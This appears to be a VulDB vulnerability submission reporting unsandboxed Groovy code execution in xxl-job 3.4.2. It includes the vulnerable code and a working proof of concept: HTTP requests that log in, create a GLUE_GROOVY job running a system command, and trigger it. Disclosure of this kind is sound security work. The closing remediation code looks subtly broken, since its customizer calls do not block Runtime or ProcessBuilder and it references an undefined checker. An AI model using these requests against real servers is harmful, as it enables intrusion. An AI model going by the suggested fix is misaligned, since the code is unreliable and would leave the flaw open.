# VulDB Submission — xxl-job v3.4.2 Remote Code Execution via Groovy Code Execution

---

## Title

**xxl-job 3.4.2 GlueFactory GroovyClassLoader Code Execution**

---

## Abstract

A critical vulnerability was found in xxl-job version 3.4.2. The vulnerability affects the `GlueFactory` component which uses `GroovyClassLoader.parseClass()` without sandbox restrictions. A normal authenticated user with jobGroup permissions can create a GLUE_GROOVY type job containing arbitrary Groovy/Java code, which executes on the executor server with full system privileges. The vulnerability allows Remote Code Execution (RCE) via the web interface without requiring administrator access.

---

## Product

- **Product**: xxl-job
- **Vendor**: xuxueli
- **Website**: https://github.com/xuxueli/xxl-job
- **Affected Version**: 3.4.2
- **Component**: GlueFactory / ScriptJobHandler

---

## Classification

| Type | Value |
|------|-------|
| **CVSS** | 8.8 High |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | Low (Normal User with jobGroup permission) |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality** | High |
| **Integrity** | High |
| **Availability** | High |

---

## Introduction

xxl-job is a distributed task scheduling platform widely used in China (10,000+ GitHub stars). In version 3.4.2, the `GroovyClassLoader.parseClass()` method compiles user-provided Groovy source code without any sandbox restrictions, allowing a normal authenticated user with jobGroup permissions to achieve Remote Code Execution (RCE) on the executor server.

---

## Vulnerability Details

**File**: `xxl-job-core/src/main/java/com/xxl/job/core/glue/GlueFactory.java`
**Lines**: 43, 76

The `GroovyClassLoader.parseClass()` method compiles user-provided Groovy source code without any sandbox restrictions. No `SecureASTCustomizer` or `CompilerConfiguration` is applied, allowing arbitrary Java/Groovy code execution including `Runtime.exec()`.

**Vulnerable Code**:
```java
private final GroovyClassLoader groovyClassLoader = new GroovyClassLoader();  // Line 43

private Class<?> getCodeSourceClass(String codeSource){
    try {
        byte[] md5 = MessageDigest.getInstance("MD5").digest(codeSource.getBytes());
        String md5Str = new BigInteger(1, md5).toString(16);

        Class<?> clazz = CLASS_CACHE.get(md5Str);
        if(clazz == null){
            clazz = groovyClassLoader.parseClass(codeSource);  // Line 76 - NO SANDBOX
            CLASS_CACHE.putIfAbsent(md5Str, clazz);
        }
        return clazz;
    } catch (Exception e) {
        return groovyClassLoader.parseClass(codeSource);  // NO SANDBOX
    }
}
```

**Additional Attack Vector**: GLUE_SHELL type jobs also execute arbitrary scripts via `Runtime.exec()` without restrictions (`ScriptUtil.java:67`).

---

## Proof of Concept

### Prerequisites
- A normal user account (role=0) on xxl-job admin panel
- The user must have jobGroup permission (assigned by administrator)

### Step 1: Authenticate

```http
POST /auth/doLogin HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

userName=test&password=test&ifRemember=on
```

**Response**:
```json
{"code":200,"data":null,"msg":"Success","success":true}
```

**Extract Cookie**: `xxl_job_login_token=<session_token>`

### Step 2: Create Malicious Groovy Job

```http
POST /jobinfo/insert HTTP/1.1
Host: target:8080
Cookie: xxl_job_login_token=<session_token>
Content-Type: application/x-www-form-urlencoded

jobGroup=1&jobDesc=RCE-Test&author=test&scheduleType=NONE&scheduleConf=&misfireStrategy=DO_NOTHING&executorRouteStrategy=FIRST&executorHandler=&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueType=GLUE_GROOVY&glueSource=import com.xxl.job.core.handler.IJobHandler
import com.xxl.job.core.context.XxlJobHelper
class DemoJobHandler extends IJobHandler {
    public void execute() throws Exception {
        def proc = ["cmd", "/c", "whoami"].execute()
        XxlJobHelper.handleSuccess(proc.text)
    }
}&glueRemark=RCE Test
```

**Response**:
```json
{"code":200,"data":"7","msg":"Success","success":true}
```

### Step 3: Trigger the Job

```http
POST /jobinfo/trigger HTTP/1.1
Host: target:8080
Cookie: xxl_job_login_token=<session_token>
Content-Type: application/x-www-form-urlencoded

id=7&executorParam=&addressList=
```

**Response**:
```json
{"code":200,"data":null,"msg":"Success","success":true}
```

---

## Impact

An attacker with a normal user account (with jobGroup permission) can:

1. **Execute arbitrary system commands** with the privileges of the xxl-job executor process
2. **Read arbitrary files** from the executor server
3. **Write arbitrary files** to the executor server
4. **Establish reverse shells** for persistent access
5. **Pivot to other systems** in the internal network
6. **Exfiltrate sensitive data** from the executor server

---

## Remediation

### Fix: Implement Groovy Sandbox

```java
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.ImportCustomizer;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;

CompilerConfiguration config = new CompilerConfiguration();
ImportCustomizer imports = new ImportCustomizer();
SecureASTCustomizer secure = new SecureASTCustomizer();

// Block dangerous imports
secure.addStarImports("java.lang.Runtime", "java.lang.ProcessBuilder");
secure.addStaticStars("java.lang.Runtime");

// Block dangerous method calls
secure.addExpressionCheckers(new MethodCallExpressionChecker());

config.addCompilationCustomizers(imports, secure);

GroovyClassLoader groovyClassLoader = new GroovyClassLoader(null, config);
```

---

## Timeline

| Date | Event |
|------|-------|
| 2026-07-14 | Vulnerability discovered and verified |
| 2026-07-14 | PoC executed successfully (RCE confirmed) |
| 2026-07-14 | VulDB submission |
| TBD | Vendor notification |
| TBD | CVE assignment |

---

## References

- **GitHub Repository**: https://github.com/xuxueli/xxl-job
- **Product Website**: https://www.xuxueli.com/xxl-job/
- **CWE-94**: https://cwe.mitre.org/data/definitions/94.html

---

## Credits

Security researcher

---

## Disclaimer

This vulnerability was discovered during a security audit of the xxl-job project. The information is provided for defensive purposes only. The author is not responsible for any misuse of this information.
